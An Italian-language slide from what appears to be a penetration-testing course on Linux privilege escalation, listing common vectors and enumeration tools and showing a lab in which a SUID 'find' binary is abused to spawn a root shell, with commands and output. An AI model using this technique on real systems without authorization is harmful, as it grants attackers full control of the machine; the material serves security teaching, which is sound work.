Capitolo 5: Post-Exploitation

Slide 5.2: Privilege Escalation
Teoria: Da www-data a Root

L'utente www-data ha privilegi limitati. Vogliamo diventare root per controllo totale.


Vettori comuni di PrivEsc:

  • SUID binaries - File con bit SUID
  • Sudo misconfig - sudo -l
  • Kernel exploits - Dirty COW, etc.
  • Cron jobs - Script eseguiti come root
  • Writable /etc/passwd
  • Capabilities - getcap
  • Password reuse - su con pass DB

Tool automatici:

  • linpeas.sh - Il più completo
  • LinEnum.sh - Classico
  • linux-exploit-suggester

Security Insight: Prima di usare linpeas, provate sempre sudo -l e SUID manualmente. Spesso bastano 2 comandi per trovare il vettore.

Lab: Ricerca Vettori PrivEsc

Check sudo permissions:

www-data@target:$ sudo -l [sudo] password for www-data: # www-data non ha sudo... proviamo altro

Cercare SUID binaries:

www-data@target:$ find / -perm -4000 2>/dev/null /usr/bin/passwd /usr/bin/sudo /usr/bin/mount /usr/bin/find ← INTERESSANTE!

Exploit SUID find (GTFOBins):

www-data@target:$ /usr/bin/find . -exec /bin/sh -p \; -quit # whoami root # id uid=33(www-data) gid=33(www-data) euid=0(root)
